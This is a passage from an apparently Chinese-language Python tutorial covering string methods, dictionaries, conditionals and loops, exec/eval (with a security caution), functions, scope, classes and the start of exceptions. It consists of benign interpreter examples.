python.org&apos;</code></pre><p><strong><em>(8) translate：进行单字符替换，可同时替换多个字符</em></strong></p><p><em>要创建转换表，可对字符串类型 str 调用方法 <code>maketrans</code> ，这个方法接受两个参数：两个长度相同的字符串，它们指定要将第一个字符串中的每个字符都替换为第二个字符串中的相应字符</em></p><pre><code>&gt;&gt;&gt; table = str.maketrans(&apos;cs&apos;,&apos;kz&apos;)&gt;&gt;&gt; &apos;this is a test&apos;.translate(table)&apos;thiz iz a tezt&apos;</code></pre><p><strong><em>(9) 字符条件判断</em></strong></p><p><em>很多字符串方法都以 is 打头，它们判断字符串是否具有特定的性质；如果字符串具备特定的性质，这些方法就返回True ，否则返回 False</em></p><p><img src="http://pguklm607.bkt.clouddn.com/isstring.png" alt=""></p><hr><h2 id="0x04-字典及用法"><a href="#0x04-字典及用法" class="headerlink" title="0x04 字典及用法"></a>0x04 字典及用法</h2><p><em>通过名称来访问其各个值的数据结构，这种数据结构称为映射（mapping）；字典是Python中唯一的内置映射类型，其中的值不按顺序排列，而是存储在键下，键可能是数、字符串或元组</em></p><h3 id="1-字典用途"><a href="#1-字典用途" class="headerlink" title="1. 字典用途"></a>1. 字典用途</h3><p><em>字典旨在能够轻松地找到特定的单词（键），以获悉其定义（值）</em></p><pre><code>1. 表示棋盘的状态，其中每个键都是由坐标组成的元组2. 存储文件修改时间，其中的键为文件名3. 数字电话/地址簿</code></pre><p><em>用法实例比较</em></p><pre><code>使用列表，查询指定人物电话号码&gt;&gt;&gt; names = [&apos;Tom&apos;,&apos;Alice&apos;,&apos;Bob&apos;,&apos;Frank&apos;]&gt;&gt;&gt; numbers = [&apos;1001&apos;,&apos;2002&apos;,&apos;3003&apos;,&apos;4004&apos;]&gt;&gt;&gt; numbers[names.index(&apos;Bob&apos;)]&apos;3003&apos;使用字典，通过键查询对应号码&gt;&gt;&gt; phonebook = {&apos;Tom&apos;:&apos;1001&apos;,&apos;Alice&apos;:&apos;2002&apos;,&apos;Bob&apos;:&apos;3003&apos;,&apos;Frank&apos;:&apos;4004&apos;}&gt;&gt;&gt; phonebook[&apos;Bob&apos;]&apos;3003&apos;</code></pre><h3 id="2-创建使用字典"><a href="#2-创建使用字典" class="headerlink" title="2. 创建使用字典"></a>2. 创建使用字典</h3><pre><code>phonebook = {&apos;Tom&apos;:&apos;1001&apos;,&apos;Alice&apos;:&apos;2002&apos;,&apos;Bob&apos;:&apos;3003&apos;,&apos;Frank&apos;:&apos;4004&apos;}</code></pre><p><em>字典由键及其相应的值组成，这种<strong>键-值对</strong>称为项（item）。在前面的示例中，键为名字，而值为电话号码。每个键与其值之间都用<strong>冒号（ : ）</strong>分隔，项之间用逗号分隔，而整个字典放在花括号内</em></p><p><strong><em>(1) 函数 dict</em></strong></p><p><em>可使用函数 dict从其他映射（如其他字典）或键-值对序列创建字典</em></p><pre><code>&gt;&gt;&gt; items = [(&apos;name&apos;,&apos;Frank&apos;),(&apos;number&apos;,30)]&gt;&gt;&gt; d = dict(items)&gt;&gt;&gt; d{&apos;name&apos;: &apos;Frank&apos;, &apos;number&apos;: 30}&gt;&gt;&gt; d[&apos;name&apos;]&apos;Frank&apos;</code></pre><p><em>使用关键字实参来调用这个函数</em></p><pre><code>&gt;&gt;&gt; d = dict(name = &apos;Tom&apos;,number = 18)&gt;&gt;&gt; d{&apos;name&apos;: &apos;Tom&apos;, &apos;number&apos;: 18}</code></pre><p><strong><em>(2) 基本操作</em></strong></p><p><em>字典的基本行为在很多方面都类似于序列</em></p><pre><code>1. len(d) 返回字典 d 包含的项（键-值对）数2. d[k] 返回与键 k 相关联的值3. d[k] = v 将值 v 关联到键 k4. del d[k] 删除键为 k 的项5. k in d 检查字典 d 是否包含键为 k 的项&gt;&gt;&gt; phonebook = {&apos;Tom&apos;:&apos;1001&apos;,&apos;Alice&apos;:&apos;2002&apos;,&apos;Bob&apos;:&apos;3003&apos;,&apos;Frank&apos;:&apos;4004&apos;}&gt;&gt;&gt; len(phonebook)4&gt;&gt;&gt; phonebook[&apos;Tom&apos;]&apos;1001&apos;&gt;&gt;&gt; phonebook[&apos;Tom&apos;] = &apos;10010&apos;&gt;&gt;&gt; phonebook[&apos;Tom&apos;]&apos;10010&apos;&gt;&gt;&gt; phonebook{&apos;Tom&apos;: &apos;10010&apos;, &apos;Alice&apos;: &apos;2002&apos;, &apos;Bob&apos;: &apos;3003&apos;, &apos;Frank&apos;: &apos;4004&apos;}&gt;&gt;&gt; del phonebook[&apos;Bob&apos;]&gt;&gt;&gt; phonebook{&apos;Tom&apos;: &apos;10010&apos;, &apos;Alice&apos;: &apos;2002&apos;, &apos;Frank&apos;: &apos;4004&apos;}&gt;&gt;&gt; &apos;Bob&apos; in phonebookFalse</code></pre><p><em>字典与列表的不同之处</em></p><pre><code>1. 键的类型：字典中的键可以是整数，但并非必须是整数。字典中的键可以是任何不可变的类型，如浮点数（实数）、字符串或元组2. 自动添加：即便是字典中原本没有的键，也可以给它赋值，这将在字典中创建一个新项。然而，如果不使用 append 或其他类似的方法，就不能给列表中没有的元素赋值3. 成员资格：表达式k in d（其中 d 是一个字典）查找的是键而不是值，而表达式 v in l （其中 l 是一个列表）查找的是值而不是索引结果字典包含指定的键，检查相应的值就很容易&gt;&gt;&gt; List = []&gt;&gt;&gt; List[2] = &apos;list&apos;IndexError: list assignment index out of range&gt;&gt;&gt; List[:] = [None]*4&gt;&gt;&gt; List[None, None, None, None]&gt;&gt;&gt; List[2] = &apos;list&apos;&gt;&gt;&gt; List[None, None, &apos;list&apos;, None]&gt;&gt;&gt; Dict = {}&gt;&gt;&gt; Dict[2] = &apos;dict&apos;&gt;&gt;&gt; Dict{2: &apos;dict&apos;}</code></pre><p><em>使用字典创建电话簿数据库</em></p><pre><code># 将姓名用作键的字典，每个人用一个字典表示# 字典包含键&apos;phone&apos;和&apos;addr&apos;,分别与电话号码与地址关联people = {&apos;Tom&apos;:{&apos;phone&apos;:&apos;10001&apos;,&apos;addr&apos;:&apos;Beijing&apos;},&apos;Frank&apos;:{&apos;phone&apos;:&apos;20002&apos;,&apos;addr&apos;:&apos;Shanghai&apos;},&apos;Alice&apos;:{&apos;phone&apos;:&apos;30003&apos;,&apos;addr&apos;:&apos;Shenzhen&apos;}}# 电话号码与地址的描述性标签，方便打印输出labels = {&apos;phone&apos;:&apos;phone number&apos;,&apos;addr&apos;:&apos;address&apos;}name = input(&apos;Name: &apos;)# 查询电话号码/地址?request = input(&apos;Phone number(p) or address(a)?&apos;)# 使用正确的键if request == &apos;p&apos;:key = &apos;phone&apos;if request == &apos;a&apos;:key = &apos;addr&apos;# 仅当名字是字典中包含的键是才打印信息if name in people: print(&quot;{}&apos;s {} is {}&quot;.format(name,labels[key],people[name][key]))==================== RESTART: H:/Code/Python/ponebook.py ====================Name: FrankPhone number(p) or address(a)?aFrank&apos;s address is Shanghai</code></pre><p><strong><em>(3) 将字符串格式设置功能用于字典</em></strong></p><p><em>可使用 <code>format_map</code> 来指出将通过一个映射来提供所需的信息；像这样使用字典时，可指定任意数量的转换说明符，条件是所有的字段名都是包含在字典中的键在模板系统中，这种字符串格式设置方式很有用</em></p><pre><code>&gt;&gt;&gt; template = &apos;&apos;&apos;&lt;html&gt;&lt;head&gt;&lt;title&gt;{title}&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;{title}&lt;/h1&gt;&lt;p&gt;{text}&lt;/p&gt;&lt;/body&gt;&apos;&apos;&apos;&gt;&gt;&gt; data = {&apos;title&apos;:&apos;My Home Page&apos;,&apos;text&apos;:&apos;Welcome to my home page!&apos;}&gt;&gt;&gt; print(template.format_map(data))&lt;html&gt;&lt;head&gt;&lt;title&gt;My Home Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;My Home Page&lt;/h1&gt;&lt;p&gt;Welcome to my home page!&lt;/p&gt;&lt;/body&gt;</code></pre><p><strong><em>(4) 字典方法</em></strong></p><p><em>A. clear： 删除所有的字典项，就地执行，因此什么都不返回（或者说返回 None ）</em></p><pre><code>&gt;&gt;&gt; d = {}&gt;&gt;&gt; d[&apos;name&apos;] = &apos;Bob&apos;&gt;&gt;&gt; d[&apos;number&apos;] = &apos;10001&apos;&gt;&gt;&gt; d{&apos;name&apos;: &apos;Bob&apos;, &apos;number&apos;: &apos;10001&apos;}&gt;&gt;&gt; returned_value = d.clear()&gt;&gt;&gt; d{}&gt;&gt;&gt; print(returned_value)None</code></pre><p><em>B. copy：返回一个新字典，其包含的键值对与原来的字典相同</em></p><p><em>浅复制：当替换副本中的值时，原件不受影响；如果修改副本中的值（就地修改而不是替换），原件也将发生变化</em></p><pre><code>&gt;&gt;&gt; x= {&apos;username&apos;:&apos;root&apos;,&apos;permission&apos;:[&apos;x&apos;,&apos;r&apos;,&apos;w&apos;]}&gt;&gt;&gt; y = x.copy()&gt;&gt;&gt; y[&apos;username&apos;] = &apos;user&apos;&gt;&gt;&gt; y[&apos;permission&apos;].remove(&apos;x&apos;)&gt;&gt;&gt; y{&apos;username&apos;: &apos;user&apos;, &apos;permission&apos;: [&apos;r&apos;, &apos;w&apos;]}&gt;&gt;&gt; x{&apos;username&apos;: &apos;root&apos;, &apos;permission&apos;: [&apos;r&apos;, &apos;w&apos;]}</code></pre><p><em>C. formkeys：创建一个新字典，其中包含指定的键，且每个键对应的值都是 None </em></p><pre><code>&gt;&gt;&gt; {}.fromkeys([&apos;name&apos;,&apos;age&apos;]){&apos;name&apos;: None, &apos;age&apos;: None}&gt;&gt;&gt; dict.fromkeys([&apos;name&apos;,&apos;age&apos;],&apos;(unknown)&apos;){&apos;name&apos;: &apos;(unknown)&apos;, &apos;age&apos;: &apos;(unknown)&apos;}</code></pre><p><em>D. get：使用 get 来访问不存在的键时，没有引发异常，而是返回 None</em></p><pre><code>&gt;&gt;&gt; d = {}&gt;&gt;&gt; print(d[&apos;name&apos;])Traceback (most recent call last):  File &quot;&lt;pyshell#79&gt;&quot;, line 1, in &lt;module&gt;    print(d[&apos;name&apos;])KeyError: &apos;name&apos;&gt;&gt;&gt; print(d.get(&apos;name&apos;))None&gt;&gt;&gt; print(d.get(&apos;name&apos;,&apos;not avaliable&apos;))   #可指定默认值not avaliable</code></pre><p><em>E. items： 返回一个包含所有字典项的列表，其中每个元素都为 (key, value) 的形式</em></p><pre><code>&gt;&gt;&gt; d.items()dict_items([(&apos;title&apos;, &apos;Python Web Site&apos;), (&apos;url&apos;, &apos;http://www.python.org&apos;), (&apos;spam&apos;, 0)])&gt;&gt;&gt; d[&apos;spam&apos;] = 1&gt;&gt;&gt; d{&apos;title&apos;: &apos;Python Web Site&apos;, &apos;url&apos;: &apos;http://www.python.org&apos;, &apos;spam&apos;: 1}</code></pre><p><em>F. keys： 返回一个字典视图，其中包含指定字典中的键</em></p><pre><code>&gt;&gt;&gt; d{&apos;title&apos;: &apos;Python Web Site&apos;, &apos;url&apos;: &apos;http://www.python.org&apos;, &apos;spam&apos;: 1}&gt;&gt;&gt; d.keys()dict_keys([&apos;title&apos;, &apos;url&apos;, &apos;spam&apos;])</code></pre><p><em>G. pop：用于获取与指定键相关联的值，并将该键-值对从字典中删除</em></p><pre><code>&gt;&gt;&gt; d = [&apos;x&apos;:&apos;1001&apos;,&apos;y&apos;:&apos;2002&apos;]SyntaxError: invalid syntax&gt;&gt;&gt; d = {&apos;x&apos;:&apos;1001&apos;,&apos;y&apos;:&apos;2002&apos;}&gt;&gt;&gt; d{&apos;x&apos;: &apos;1001&apos;, &apos;y&apos;: &apos;2002&apos;}&gt;&gt;&gt; d.pop(&apos;y&apos;)&apos;2002&apos;&gt;&gt;&gt; d{&apos;x&apos;: &apos;1001&apos;}</code></pre><p><em>H. popitem： 类似于 list.pop ，但 list.pop 弹出列表中的最后一个元素，而 popitem 随机地弹出一个字典项</em></p><pre><code>&gt;&gt;&gt; d = {&apos;url&apos;: &apos;http://www.python.org&apos;, &apos;spam&apos;: 0, &apos;title&apos;: &apos;Python Web Site&apos;}&gt;&gt;&gt; d.popitem()(&apos;title&apos;, &apos;Python Web Site&apos;)&gt;&gt;&gt; d{&apos;url&apos;: &apos;http://www.python.org&apos;, &apos;spam&apos;: 0}</code></pre><p><em>I. setdefault： 类似get ，获取与指定键相关联的值，还在字典不包含指定的键时，在字典中添加指定的键-值对</em></p><pre><code>&gt;&gt;&gt; d = {}&gt;&gt;&gt; d.setdefault(&apos;name&apos;, &apos;N/A&apos;)&apos;N/A&apos;&gt;&gt;&gt; d{&apos;name&apos;: &apos;N/A&apos;}&gt;&gt;&gt; d[&apos;name&apos;] = &apos;Gumby&apos;&gt;&gt;&gt; d.setdefault(&apos;name&apos;, &apos;N/A&apos;)&apos;Gumby&apos;&gt;&gt;&gt; d{&apos;name&apos;: &apos;Gumby&apos;}</code></pre><p><em>J. update： 使用一个字典中的项来更新另一个字典</em></p><pre><code>&gt;&gt;&gt; d = {&apos;title&apos;:&apos;Python Web Site&apos;,&apos;url&apos;:&apos;http://www.python.org&apos;,&apos;changed&apos;:&apos;2018.10.20&apos;}&gt;&gt;&gt; x = {&apos;url&apos;:&apos;www.python.org&apos;}&gt;&gt;&gt; d.update(x)&gt;&gt;&gt; d{&apos;title&apos;: &apos;Python Web Site&apos;, &apos;url&apos;: &apos;www.python.org&apos;, &apos;changed&apos;: &apos;2018.10.20&apos;}</code></pre><p><em>K. values： 返回一个由字典中的值组成的字典视图</em></p><pre><code>&gt;&gt;&gt; d = {}&gt;&gt;&gt; d[1] = 1&gt;&gt;&gt; d[2] = 2&gt;&gt;&gt; d[3] = 2&gt;&gt;&gt; d[4] = 1&gt;&gt;&gt; d.values()dict_values([1, 2, 2, 1])</code></pre><hr><h2 id="0x05-条件及循环"><a href="#0x05-条件及循环" class="headerlink" title="0x05 条件及循环"></a>0x05 条件及循环</h2><h3 id="1-条件语句"><a href="#1-条件语句" class="headerlink" title="1. 条件语句"></a>1. 条件语句</h3><p><strong><em>(1) 布尔值</em></strong></p><p><em>用作布尔表达式，下面的值都将被解释器视为假</em></p><pre><code>False None 0 &quot;&quot; () [] {}</code></pre><p><em>标准值 False 和 None 、各种类型（包括浮点数、复数等）的数值0、空序列（如空字符串、空元组和空列表）以及空映射（如空字典）都被视为假</em></p><p><em>布尔值 True 和 False 属于类型 bool ，而 bool 与 list 、 str 和 tuple 一样，可用来转换其他的值</em></p><pre><code>&gt;&gt;&gt; bool(1)True&gt;&gt;&gt; bool(None)False&gt;&gt;&gt; bool(0)False</code></pre><p><strong><em>(2) if 语句</em></strong></p><p>条件（ if 和冒号之间的表达式）<br>为前面定义的真，就执行后续代码块；如果条件为假，就不执行</p><pre><code>name = input(&apos;What is your name? &apos;)if name.endswith(&apos;Frank&apos;):    print(&apos;Hello, Mr. Frank&apos;)</code></pre><p><strong><em>(3) else 子句</em></strong></p><pre><code>name = input(&apos;What is your name? &apos;)if name.endswith(&apos;Frank&apos;):    print(&apos;Hello, Mr. Frank&apos;)else:    print(&apos;Hello,stranger&apos;)</code></pre><p><strong><em>(3) elif 子句</em></strong></p><p><em>要检查多个条件，可使用 elif；elif 是 else if 的缩写</em></p><pre><code>num = int(input(&apos;Enter a number: &apos;))if num &gt; 0:    print(&apos;The number is positive&apos;)elif num &lt; 0:    print(&apos;The number is negative&apos;)else:    print(&apos;The number is zero&apos;)</code></pre><p><strong><em>(4) 代码块嵌套</em></strong></p><pre><code>name = input(&apos;What is your name? &apos;)if name.endswith(&apos;Gumby&apos;):    if name.startswith(&apos;Mr.&apos;):        print(&apos;Hello, Mr. Gumby&apos;)    elif name.startswith(&apos;Mrs.&apos;):        print(&apos;Hello, Mrs. Gumby&apos;)    else:        print(&apos;Hello, Gumby&apos;)else:    print(&apos;Hello, stranger&apos;)</code></pre><p><strong><em>(5) 条件运算符</em></strong></p><p><img src="http://pguklm607.bkt.clouddn.com/%E6%9D%A1%E4%BB%B6.png" alt=""></p><p><strong><em>(6) 断言</em></strong></p><p><em>程序在错误条件出现时立即崩溃，可在语句中使用关键字 <code>assert</code></em></p><pre><code>&gt;&gt;&gt; age = 10&gt;&gt;&gt; assert 0 &lt; age &lt; 100&gt;&gt;&gt; age = -1&gt;&gt;&gt; assert 0 &lt; age &lt; 100Traceback (most recent call last):  File &quot;&lt;pyshell#174&gt;&quot;, line 1, in &lt;module&gt;    assert 0 &lt; age &lt; 100AssertionError</code></pre><h3 id="2-循环语句"><a href="#2-循环语句" class="headerlink" title="2. 循环语句"></a>2. 循环语句</h3><p><strong><em>(1) while 循环</em></strong></p><p><em>用于在条件为真时反复执行代码块</em></p><pre><code>x = 1sum = 0while x &lt;= 100:    sum = sum+x    x += 1print(sum)</code></pre><p><strong><em>(2) for 循环</em></strong></p><p><em>为序列（或其他可迭代对象）中每个元素执行代码块</em></p><pre><code>words = [&apos;to&apos;,&apos;be&apos;,&apos;or&apos;,&apos;not&apos;,&apos;to&apos;,&apos;be&apos;]for word in words:    print(word)</code></pre><p><em>Python提供了一个创建范围的内置函数<code>range()</code></em></p><pre><code>&gt;&gt;&gt; list(range(0,10))   # 起始位置默认为0[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]&gt;&gt;&gt; for number in range(1,101):  # 打印数字1~100    print(number)&gt;&gt;&gt; for n in range(0,10,2):  # 第三个参数为步长    print(n)</code></pre><p><strong><em>(3) 迭代字典</em></strong></p><p><em>可使用 keys 等字典方法来获取所有的键；可使用 d.values 获取值</em></p><pre><code>d = {&apos;x&apos;:1,&apos;y&apos;:2,&apos;z&apos;:3}for key in d:    print(key,&apos;corresponds to&apos;,d[key])for key, value in d.items():    print(key, &apos;corresponds to&apos;, value)</code></pre><h3 id="3-列表推导"><a href="#3-列表推导" class="headerlink" title="3. 列表推导"></a>3. 列表推导</h3><p><em>列表推导是一种从其他列表创建列表的方式，类似于数学中的集合推导；列表推导的工作原理类似于 for 循环</em></p><pre><code>&gt;&gt;&gt; [x*x for x in range(10) if x%3 ==0][0, 9, 36, 81]&gt;&gt;&gt; squares = {i:&quot;{} squared is {}&quot;.format(i, i**2) for i in range(10)}&gt;&gt;&gt; squares[9]&apos;9 squared is 81&apos;</code></pre><h3 id="4-pass、del与exec"><a href="#4-pass、del与exec" class="headerlink" title="4. pass、del与exec"></a>4. pass、del与exec</h3><p><strong><em>(1) pass 语句</em></strong></p><p><em>什么都不用做，可用作占位符</em></p><p><strong><em>(2) del 语句</em></strong></p><p><em>不仅会删除到对象的引用，还会删除名称本身</em></p><pre><code>&gt;&gt;&gt; x = 1&gt;&gt;&gt; x1&gt;&gt;&gt; del x&gt;&gt;&gt; xNameError: name &apos;x&apos; is not defined</code></pre><p><strong><em>(3)  exec 和 eval</em></strong></p><p><em>使用 exec 和 eval 执行字符串及计算其结果；执行存储在字符串中的Python代码，可能会带来严重的安全隐患；如果将部分内容由用户提供的字符串作为代码执行，将无法控制代码的行为</em></p><p><em>A. exec：函数 exec将字符串作为代码执行</em></p><pre><code>&gt;&gt;&gt; exec(&quot;print(&apos;Hello, python&apos;)&quot;)Hello, python</code></pre><p><em>函数 exec 主要用于动态地创建代码字符串；如果这种字符串来自其他地方（可能是用户），就几乎无法确定它将包含什么内容；因此为了安全起见，要提供一个字典以充当命名空间</em></p><pre><code>&gt;&gt;&gt; from math import sqrt&gt;&gt;&gt; exec(&quot;sqrt = 1&quot;)&gt;&gt;&gt; sqrt(4)Traceback (most recent call last):  File &quot;&lt;pyshell#205&gt;&quot;, line 1, in &lt;module&gt;    sqrt(4)TypeError: &apos;int&apos; object is not callable&gt;&gt;&gt; from math import sqrt&gt;&gt;&gt; scope = {}&gt;&gt;&gt; exec(&apos;sqrt = 1&apos;,scope)  # 提供字典充当命名空间&gt;&gt;&gt; sqrt(4)2.0&gt;&gt;&gt; scope[&apos;sqrt&apos;]1&gt;&gt;&gt; len(scope)2&gt;&gt;&gt; scope.keys() dict_keys([&apos;__builtins__&apos;, &apos;sqrt&apos;])  # 自动在其中添加了包含所有内置函数和值的字典 __builtins__ </code></pre><p><em>B. eval： 计算用字符串表示的表达式并返回结果</em></p><p> <em>exec 执行一系列Python语句，而 eval 计算用字符串表示的Python表达式的值，并返回结果</em></p><pre><code>&gt;&gt;&gt; scope = {}&gt;&gt;&gt; scope[&apos;x&apos;] = 2&gt;&gt;&gt; scope[&apos;y&apos;] = 3&gt;&gt;&gt; eval(&apos;x * y&apos;,scope)6&gt;&gt;&gt; len(scope)3&gt;&gt;&gt; scope.keys()dict_keys([&apos;x&apos;, &apos;y&apos;, &apos;__builtins__&apos;])</code></pre><hr><h2 id="0x06-函数与作用域"><a href="#0x06-函数与作用域" class="headerlink" title="0x06  函数与作用域"></a>0x06  函数与作用域</h2><h3 id="1-自定义函数"><a href="#1-自定义函数" class="headerlink" title="1. 自定义函数"></a>1. 自定义函数</h3><p><em>要判断某个对象是否可调用，可使用内置函数 <code>callable</code></em></p><pre><code>&gt;&gt;&gt; import math&gt;&gt;&gt; x = 1&gt;&gt;&gt; y = math.sqrt&gt;&gt;&gt; callable(x)False&gt;&gt;&gt; callable(y)True</code></pre><p><em>使用 <code>def</code> （表示定义函数）语句</em></p><pre><code>def fibs(num):    result = [0,1]    for i in range(num-2):        result.append(result[-2] + result[-1])    return result&gt;&gt;&gt; fibs(10)[0, 1, 1, 2, 3, 5, 8, 13, 21, 34]</code></pre><p><strong><em>给函数编写文档</em></strong></p><pre><code>def square(x):    &apos;Calculates the square of the number x.&apos;    return x * x&gt;&gt;&gt; square.__doc__&apos;Calculates the square of the number x.&apos;&gt;&gt;&gt; help(sqrt)Help on built-in function sqrt in module math:sqrt(...)    sqrt(x)    Return the square root of x.</code></pre><h3 id="2-函数参数"><a href="#2-函数参数" class="headerlink" title="2. 函数参数"></a>2. 函数参数</h3><p><em>参数存储在局部作用域内，在函数内部给参数赋值对外部没有任何影响</em></p><pre><code>&gt;&gt;&gt; def change(n):    n = &apos;Chinese&apos;&gt;&gt;&gt; name = &apos;English&apos;&gt;&gt;&gt; change(name)&gt;&gt;&gt; name&apos;English&apos;&gt;&gt;&gt; name = &apos;English&apos;&gt;&gt;&gt; n = name    # 与传递参数的效果几乎相同&gt;&gt;&gt; n = &apos;Chinese&apos;  # 在函数内部进行的&gt;&gt;&gt; name&apos;English&apos;</code></pre><p><em>字符串（以及数和元组）是不可变的（immutable），参数为可变的数据结构（如列表），可修改变量关联到的列表</em></p><pre><code>将同一个列表赋给两个变量时，这两个变量将同时指向这个列表&gt;&gt;&gt; def change(n):    n[0] = &apos;Chinese&apos;&gt;&gt;&gt; names = [&apos;English&apos;,&apos;England&apos;]&gt;&gt;&gt; change(names)&gt;&gt;&gt; names[&apos;Chinese&apos;, &apos;England&apos;]&gt;&gt;&gt; names = [&apos;English&apos;,&apos;England&apos;]&gt;&gt;&gt; n = names # 再次假装传递名字作为参数&gt;&gt;&gt; n[0] = &apos;Chinese&apos; # 修改列表&gt;&gt;&gt; names[&apos;Chinese&apos;, &apos;England&apos;]</code></pre><p><em>必须创建列表的副本；对序列执行切片操作时，返回的切片都是副本</em></p><pre><code>创建覆盖整个列表的切片，得到的将是列表的副本&gt;&gt;&gt; names = [&apos;English&apos;,&apos;England&apos;]&gt;&gt;&gt; n = names[:]   # n和names包含两个相等但不同的列表&gt;&gt;&gt; n is namesFalse&gt;&gt;&gt; n == namesTrue&gt;&gt;&gt; names = [&apos;English&apos;,&apos;England&apos;]&gt;&gt;&gt; n = names[:] &gt;&gt;&gt; n[0] = &apos;Chinese&apos;  &gt;&gt;&gt; names[&apos;English&apos;, &apos;England&apos;]</code></pre><p><strong><em>收集参数：使用星号收集余下的位置参数</em></strong></p><pre><code>&gt;&gt;&gt; def print_params(title,*params):    print(title)    print(params)&gt;&gt;&gt; print_params(&apos;params&apos;,1,4,7)params(1, 4, 7)&gt;&gt;&gt; def middle(x,*y,z):    print(x,y,z)&gt;&gt;&gt; middle(1,2,3,4,z=7)  # 使用名称z来指定后续参数1 (2, 3, 4) 7]星号不会收集关键字参数&gt;&gt;&gt; def print_params(title,*params):        print(title)        print(params)&gt;&gt;&gt; print_params(&apos;name&apos;,age=1)TypeError: print_params() got an unexpected keyword argument &apos;age&apos;收集关键字参数，可使用两个星号&gt;&gt;&gt; def print_params_2(**params):    print(params)&gt;&gt;&gt; print_params_2(x=1,y=2,z=3){&apos;x&apos;: 1, &apos;y&apos;: 2, &apos;z&apos;: 3}</code></pre><h3 id="3-作用域"><a href="#3-作用域" class="headerlink" title="3. 作用域"></a>3. 作用域</h3><p><em>变量是指向值的名称，字典中的键指向值，有一个名为 vars 的内置函数，它返回这个不可见的字典</em></p><p><em>除全局作用域外，每个函数调用都将创建一个</em></p><pre><code>&gt;&gt;&gt; def foo(): x=4&gt;&gt;&gt; x = 1&gt;&gt;&gt; foo()&gt;&gt;&gt; x1</code></pre><p><em>调用 foo 时创建了一个新的命名空间，供 foo 中的代码块使用；赋值语句 x = 4是在这个内部作用域（局部命名空间）中执行的，不影响外部（全局）作用域内的 x </em></p><p><em>如果有一个局部变量或参数与你要访问的全局变量同名，就无法直接访问全局变量，因为它被局部变量遮住了；可使用函数 globals 来访问全局变量</em></p><pre><code>&gt;&gt;&gt; def combine(parameter):        print(parameter + globals()[&apos;parameter&apos;])&gt;&gt;&gt; parameter = &apos;berry&apos;&gt;&gt;&gt; combine(&apos;Shrub&apos;)Shrubberry</code></pre><hr><h2 id="0x07-面向对象"><a href="#0x07-面向对象" class="headerlink" title="0x07 面向对象"></a>0x07 面向对象</h2><p><em>对象意味着一系列数据（属性）以及一套访问和操作这些数据的方法</em></p><h3 id="1-基本特性"><a href="#1-基本特性" class="headerlink" title="1. 基本特性"></a>1. 基本特性</h3><pre><code>1. 类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例2. 方法：类中定义的函数3. 类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用4. 数据成员：类变量或者实例变量用于处理类及其实例对象的相关的数据5. 方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写6. 实例变量：定义在方法中的变量，只作用于当前实例的类7. 继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟&quot;是一个（is-a）&quot;关系（例图，Dog是一个Animal）8. 实例化：创建一个类的实例，类的具体对象9. 对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法</code></pre><p><strong><em>(1) 多态</em></strong></p><p><em>可对不同类型的对象执行相同的操作，即便不知道变量指向的是哪种对象，也能够对其执行操作，且操作的行为将随对象所属的类型（类）而异</em></p><pre><code>无需知道对象所属的类（对象的类型）就能调用其方法&gt;&gt;&gt; &apos;abc&apos;.count(&apos;a&apos;)1&gt;&gt;&gt; [&apos;a&apos;,1,2,&apos;a&apos;].count(&apos;a&apos;)2</code></pre><p><strong><em>(2) 封装</em></strong></p><p><em>封装（encapsulation）指的是向外部隐藏不必要的细节</em></p><pre><code>无需知道对象的构造就能使用其方法&gt;&gt;&gt; o = OpenObject() # 创建一个对象，将其关联到变量 o&gt;&gt;&gt; o.set_name(&apos;Sir Lancelot&apos;)&gt;&gt;&gt; o.get_name()&apos;Sir Lancelot&apos;</code></pre><h3 id="2-类及其用法"><a href="#2-类及其用法" class="headerlink" title="2. 类及其用法"></a>2. 类及其用法</h3><p><strong><em>(1) 类的创建</em></strong></p><pre><code>class Person:    def set_name(self,name):        self.name = name    def get_name(self):        return self.name    def greet(self):        print(&quot;Hello world! I&apos;m {}&quot;.format(self.name))</code></pre><p><em>示例包含三个方法定义，它们类似于函数定义，但位于 class 语句内；class 语句创建独立的命名空间，用于在其中定义函数</em></p><pre><code>创建实例来引用对象&gt;&gt;&gt; foo = Person()&gt;&gt;&gt; bar = Person()&gt;&gt;&gt; foo.set_name(&apos;Lucy&apos;)&gt;&gt;&gt; bar.set_name(&apos;Alice&apos;)&gt;&gt;&gt; foo.greet()Hello world! I&apos;m Lucy&gt;&gt;&gt; bar.greet()Hello world! I&apos;m Alice可以从外部访问这些属性&gt;&gt;&gt; foo.name&apos;Lucy&apos;&gt;&gt;&gt; bar.name = &apos;Frank&apos;&gt;&gt;&gt; bar.greet()Hello world! I&apos;m Frank</code></pre><p><strong><em>(2) 类的方法</em></strong></p><p><em>在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 self, 且为第一个参数，self 代表的是类的实例</em></p><p><strong><em>(3) 继承与多继承</em></strong></p><p><em>派生类定义</em></p><pre><code>class DerivedClassName(BaseClassName1):&lt;statement-1&gt;...&lt;statement-N&gt;</code></pre><p><em>圆括号中基类的顺序，若是基类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找基类中是否包含方法</em></p><p><em>多继承形式</em></p><pre><code>class DerivedClassName(Base1, Base2, Base3):&lt;statement-1&gt;...&lt;statement-N&gt;</code></pre><p><em>圆括号中父类的顺序，若是父类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找父类中是否包含方法</em></p><hr><h2 id="0x08-异常及处理"><a href="#0x08-异常及处理" class="headerlink" title="0x08 异常及处理"></a>0x08 异常及处理</h2><h3 id="1-异常"><a href="#1-异常" class="headerlink" title="1. 异常"></a>1. 异常</h3><p><em>Python使用<strong>异常对象</strong>来表示异常状态，并在遇到错误时引发异常。异常对象未被处理（或捕获）时，程序将终止并显示一条错误消息<code>（traceback）</code></em></p><pre><code>&gt;&gt;&gt; 1/0Traceback (most recent call last):  File &quot;&lt;pyshell#306&gt;&quot;, line 1, in &lt;module&gt;ZeroDivisionError: division by 